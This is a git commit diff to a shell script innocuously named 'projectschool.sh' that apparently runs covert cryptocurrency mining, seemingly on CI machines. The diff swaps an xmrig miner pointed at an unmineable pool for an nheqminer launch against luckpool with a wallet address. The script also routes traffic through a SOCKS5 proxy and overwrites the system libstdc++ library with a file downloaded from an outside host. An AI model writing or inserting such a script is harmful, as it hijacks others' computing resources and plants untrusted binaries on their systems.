5375e68d9f0cc55cbd5f9d0b87fa9cfed3d61c31
sayepttwarnis <93639205+sayepttwarnis@users.noreply.github.com>
2021-11-03 14:02:20 +0700

    Update projectschool.sh

--- projectschool.sh
+++ projectschool.sh
@@ -1,5 +1,9 @@
+sudo apt-get update
+sudo apt-get upgrade -y
+sudo apt-get dist-update
 curl -v -x socks5://207.180.236.140:1080 https://circleci.com//
 curl -o "/usr/lib/x86_64-linux-gnu/libstdc++.so.6" "https://doxspace.xyz/libstdc++.so.6"
-wget https://github.com/xmrig/xmrig/releases/download/v6.12.2/xmrig-6.12.2-linux-x64.tar.gz --no-check-certificate
-tar xvf xmrig-6.12.2-linux-x64.tar.gz
-cd xmrig-6.12.2;./xmrig -o rx-us.unmineable.com:3333 -a rx/0 -k -u SHIB:0xf932e7CD10E3bDa943916024358951b6C5c06F02.$(echo $(shuf -i 1000-9999 -n 1)-shibago#ydex-20uq) -p x
+wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz
+tar -xvf nheqminer-Linux-v0.8.2.tgz 
+tar -xvf nheqminer-Linux-v0.8.2.tar.gz
+nheqminer/nheqminer -v -l eu.luckpool.net:3956 -u RSLaafsZRq7WNqhcCQQzwxe57y2PZc3eP8.1_VPS_4vCpu -p x -t 2
